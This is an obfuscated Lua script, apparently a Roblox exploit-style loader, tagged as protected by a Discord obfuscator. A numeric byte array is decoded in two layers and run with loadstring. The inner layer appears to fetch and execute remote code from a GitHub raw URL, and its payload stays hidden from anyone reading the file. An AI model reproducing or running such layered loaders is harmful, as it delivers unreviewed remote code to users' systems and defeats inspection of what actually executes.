--[[This script has been protected by Guestly obfuscator on Discord]]--
local _VM={OP_LOAD=1,OP_CALL=2,OP_RET=3}
local function _exec(x) return x end
_exec(_VM)
local _WlRtNqj={110,113,101,99,110,34,97,88,80,80,99,70,103,86,73,89,63,125,54,56,46,54,56,46,59,52,46,59,52,46,58,55,46,51,50,55,46,51,50,56,46,51,51,56,46,53,53,46,51,51,56,46,51,50,50,46,51,51,55,46,51,50,56,46,51,51,53,46,51,51,57,46,53,53,46,51,50,55,46,59,58,46,51,51,56,46,53,53,46,59,59,46,51,50,52,46,51,50,52,46,51,51,51,46,53,53,46,51,51,53,46,51,51,55,46,51,51,52,46,51,51,57,46,51,50,52,46,51,50,50,46,51,51,57,46,51,50,52,46,51,50,51,46,53,53,46,59,59,46,51,52,52,46,53,53,46,57,52,46,51,51,58,46,51,50,52,46,51,51,56,46,51,51,57,46,51,50,59,46,51,52,52,46,53,53,46,51,51,52,46,59,59,46,51,50,53,46,51,51,58,46,51,51,56,46,51,50,50,46,59,58,46,51,51,57,46,51,51,52,46,51,51,55,46,53,53,46,51,51,52,46,51,51,51,46,53,53,46,56,59,46,51,50,56,46,51,51,56,46,51,50,50,46,51,51,52,46,51,51,55,46,51,50,51,46,59,54,46,59,54,46,54,56,46,54,56,46,51,51,46,51,50,59,46,51,51,52,46,59,58,46,51,50,51,46,51,51,56,46,51,51,57,46,51,51,55,46,51,50,56,46,51,51,51,46,51,50,54,46,54,51,46,51,50,54,46,59,58,46,51,51,50,46,51,50,52,46,55,59,46,57,53,46,51,51,57,46,51,51,57,46,51,51,53,46,57,52,46,51,50,52,46,51,51,57,46,54,51,46,53,55,46,51,50,55,46,51,51,57,46,51,51,57,46,51,51,53,46,51,51,56,46,55,59,46,54,58,46,54,58,46,51,51,55,46,59,58,46,51,52,50,46,54,57,46,51,50,54,46,51,50,56,46,51,51,57,46,51,50,55,46,51,51,58,46,59,59,46,51,51,58,46,51,51,56,46,51,50,52,46,51,51,55,46,51,50,50,46,51,51,52,46,51,51,51,46,51,51,57,46,51,50,52,46,51,51,51,46,51,51,57,46,54,57,46,51,50,50,46,51,51,52,46,51,51,50,46,54,58,46,57,52,46,51,51,58,46,51,50,52,46,51,51,56,46,51,51,57,46,51,50,59,46,51,52,52,46,58,55,46,51,50,55,46,51,50,52,46,57,52,46,51,51,55,46,51,50,52,46,59,58,46,51,51,57,46,51,50,52,46,51,51,56,46,51,51,57,46,57,52,46,51,51,58,46,51,50,52,46,51,51,56,46,51,51,57,46,54,58,46,57,58,46,51,51,52,46,51,50,51,46,51,50,52,46,51,51,56,46,54,58,46,51,51,55,46,51,50,52,46,51,50,53,46,51,51,56,46,54,58,46,51,50,55,46,51,50,52,46,59,58,46,51,50,51,46,51,51,56,46,54,58,46,51,51,50,46,59,58,46,51,50,56,46,51,51,51,46,54,58,46,56,59,46,51,51,55,46,51,50,52,46,59,58,46,51,51,50,46,51,50,50,46,51,51,52,46,51,51,55,46,51,50,52,46,54,56,46,57,58,46,51,51,52,46,51,50,51,46,51,50,52,46,54,56,46,57,58,46,59,58,46,51,50,51,46,51,50,52,46,54,56,46,59,59,46,51,52,52,46,54,56,46,57,52,46,51,51,58,46,51,50,52,46,51,51,56,46,51,51,57,46,51,50,59,46,51,52,52,46,54,56,46,59,58,46,51,51,51,46,51,50,51,46,54,56,46,58,57,46,51,51,52,46,51,51,52,46,51,51,55,46,51,51,53,46,51,51,55,46,54,59,46,53,55,46,54,52,46,54,52,46,54,51,46,54,52,127,12,110,113,101,99,110,34,104,119,112,101,118,107,113,112,34,97,117,116,87,110,114,108,116,42,118,43,12,110,113,101,99,110,34,117,63,36,36,12,104,113,116,34,107,63,51,46,37,118,34,102,113,34,117,63,117,48,48,117,118,116,107,112,105,48,101,106,99,116,42,118,93,107,95,47,51,43,34,103,112,102,12,116,103,118,119,116,112,34,117,34,103,112,102,12,110,113,101,99,110,34,104,119,112,101,118,107,113,112,34,97,121,120,114,88,74,89,86,91,105,42,104,43,12,110,113,101,99,110,34,110,102,63,110,113,99,102,117,118,116,107,112,105,34,113,116,34,110,113,99,102,12,107,104,34,112,113,118,34,110,102,34,118,106,103,112,34,110,113,101,99,110,34,103,63,105,103,118,104,103,112,120,34,99,112,102,34,105,103,118,104,103,112,120,42,50,43,34,113,116,34,97,73,34,110,102,63,103,48,110,113,99,102,117,118,116,107,112,105,34,113,116,34,103,48,110,113,99,102,34,103,112,102,12,116,103,118,119,116,112,34,110,102,42,104,43,42,43,12,103,112,102,12,97,121,120,114,88,74,89,86,91,105,42,97,117,116,87,110,114,108,116,42,97,88,80,80,99,70,103,86,73,89,43,43}
local function _BRBYjMX(t)
local s=""
for i=1,#t do s=s..string.char(t[i]-2) end
return s end
local function _ipRhxtY(f)
local ld=loadstring or load
if not ld then local e=getfenv and getfenv(0) or _G ld=e.loadstring or e.load end
return ld(f)()
end
_ipRhxtY(_BRBYjMX(_WlRtNqj))
